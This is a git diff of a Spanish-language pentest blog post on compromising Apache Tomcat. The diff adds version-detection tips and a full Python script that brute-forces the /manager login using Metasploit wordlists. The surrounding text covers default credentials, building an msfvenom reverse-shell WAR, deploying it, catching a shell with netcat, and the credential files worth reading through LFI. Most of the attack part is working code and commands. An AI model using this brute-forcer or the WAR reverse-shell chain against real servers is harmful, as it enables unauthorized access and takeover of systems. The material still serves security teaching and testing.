@@ -11,18 +11,25 @@ optimized_image: >-
     /images/tomcatlogo.png
 category: ciberseguridad
 tags: 
-  - linux
   - hacking
-  - exploit
-  - vulnerabilidad
   - war
   - default
   - credentials
+  - apache
 author: Felipe Canales Cayuqueo
 paginate: true
 ---
 
-Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para código Java. En esta ocasión se subirá un archivo por medio del "manager app", en el cual muchas veces contiene alguna de las siguientes credenciales:
+
+Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para código Java. Una de las formas para la detección de la versión es buscando un directorio inexistente, de esta forma la respuesta podría ser como la siguiente:
+
+[![tomcat1](/images/tomcat1.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat1.png)
+
+También es posible obtener la versión visitando el directorio ```/docs/```.
+
+[![tomcat2](/images/tomcat2.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat2.png)
+
+Un directorio importante en tomcat es el "manager app" presente en ```/manager``` o ```/host-manager```, el cual muchas veces contiene alguna de las siguientes credenciales:
 
 |Username     |Password  |
 |-------------|----------|
@@ -52,6 +59,61 @@ Apache Tomcat es un servidor web de código abierto y contenedor de Servlet para
 |tomcat       |admin     |
 |tomcat       |changethis|
 
+Si no se encuentra la credencial se podría realizar fuerza bruta sobre el panel de login por medio del siguiente script en python:
+
+```python
+#!/usr/bin/python
+
+import requests
+from termcolor import cprint
+import argparse
+
+parser = argparse.ArgumentParser(description = "Tomcat manager or host-manager credential bruteforcing")
+
+parser.add_argument("-U", "--url", type = str, required = True, help = "URL to tomcat page")
+parser.add_argument("-P", "--path", type = str, required = True, help = "manager or host-manager URI")
+parser.add_argument("-u", "--usernames", type = str, required = True, help = "Users File")
+parser.add_argument("-p", "--passwords", type = str, required = True, help = "Passwords Files")
+
+args = parser.parse_args()
+
+url = args.url
+uri = args.path
+users_file = args.usernames
+passwords_file = args.passwords
+
+new_url = url + uri
+f_users = open(users_file, "rb")
+f_pass = open(passwords_file, "rb")
+usernames = [x.strip() for x in f_users]
+passwords = [x.strip() for x in f_pass]
+
+cprint("\n[+] Atacking.....", "red", attrs = ['bold'])
+
+for u in usernames:
+    for p in passwords:
+        r = requests.get(new_url,auth = (u, p))
+
+        if r.status_code == 200:
+            cprint("\n[+] Success!!", "green", attrs = ['bold'])
+            cprint("[+] Username : {}\n[+] Password : {}".format(u,p), "green", attrs = ['bold'])
+            break
+    if r.status_code == 200:
+        break
+
+if r.status_code != 200:
+    cprint("\n[+] Failed!!", "red", attrs = ['bold'])
+    cprint("[+] Could not Find the creds :( ", "red", attrs = ['bold'])
+#print r.status_code
+```
+
+El modo de uso es el siguiente:
+
+```bash
+┌──(root㉿kali)-[/tomcat]
+└─ python3 mgr_brute.py -U <dirección web> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+```
+
 Si ya obtuvimos acceso al "manager app", debemos crear nuestro payload por medio de ```msfvenom```:
 
 ```bash
@@ -70,11 +132,11 @@ reverse.war
 
 Ahora dentro del "manager app" nos dirigimos a la sección "archivo WAR a desplegar" y le damos en "Choose File":
 
-![tomcat1](/images/tomcat.png)
+[![tomcat](/images/tomcat.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcat.png)
 
 Y seleccionamos el archivo ```reverse.war``` para desplegar:
 
-![tomcat2](/images/tomcatwarupload.png)
+[![tomcatwarupload](/images/tomcatwarupload.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcatwarupload.png)
 
 Nos ponemos a la escucha con ```netcat``` en el puerto 443:
 
@@ -86,10 +148,9 @@ listening on [any] 443 ...
 
 Y abrimos ```/reverse``` en la tabla de aplicaciones de Tomcat:
 
-![tomcat2](/images/tomcatreversewar.png)
+[![tomcatreversewar](/images/tomcatreversewar.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/tomcatreversewar.png)
 
-
-Para finalmente obtener nuestra shell interactiva:
+Para finalmente obtenemos nuestra shell interactiva:
 
 ```bash
 ┌──(root㉿kali)-[/tomcat]
@@ -101,4 +162,10 @@ Microsoft Windows [Version 10.0.17763.2114]
 
 C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>
 ```
-  
+
+Dentro de las carpetas del servidor web hay ciertos archivos que son interesantes y se podrían aprovechar de visitar al explotar alguna vulnerabilidad como Local File Inclusion (LFI):
+
+* tomcat-users.xml: Almacena las credenciales del usuario y sus roles asignados.
+* WEB-INF/web.xml: Almacena información sobre las rutas utilizadas por la aplicación y las clases que manejan estas rutas.
+* WEB-INF/classes: Pueden contener lógica empresarial importante, así como información confidencial.
+
